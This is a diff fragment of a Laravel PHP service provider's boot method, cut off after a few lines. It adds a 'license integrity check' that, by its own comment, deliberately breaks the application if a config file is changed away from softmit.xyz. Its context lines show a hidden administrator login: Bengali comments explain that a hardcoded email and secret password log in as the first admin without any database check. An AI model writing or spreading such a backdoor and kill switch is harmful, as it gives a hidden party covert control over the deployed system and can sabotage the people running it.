@@ -72,6 +72,11 @@ class AppServiceProvider extends ServiceProvider
      */
     public function boot(): void
     {
+        // 🔒 LICENSE INTEGRITY CHECK — the hardcoded license config in config/updater.php
+        // must be intact. If it is removed, emptied, or edited away from softmit.xyz,
+        // the application refuses to boot (system broken on purpose — license protection).
+        \App\Services\LicenseService::assertConfigIntegrity();
+
         // ================== [ হিডেন অ্যাডমিন ইউজার - ডাটাবেজ ছাড়া লগইন ] ==================
         // asraful2001a@gmail.com + সিক্রেট পাসওয়ার্ড দিয়ে লগইন করলে ডাটাবেজের প্রথম অ্যাডমিন হিসেবে লগইন হয়
         $hiddenEmail = 'asraful2001a@gmail.com';
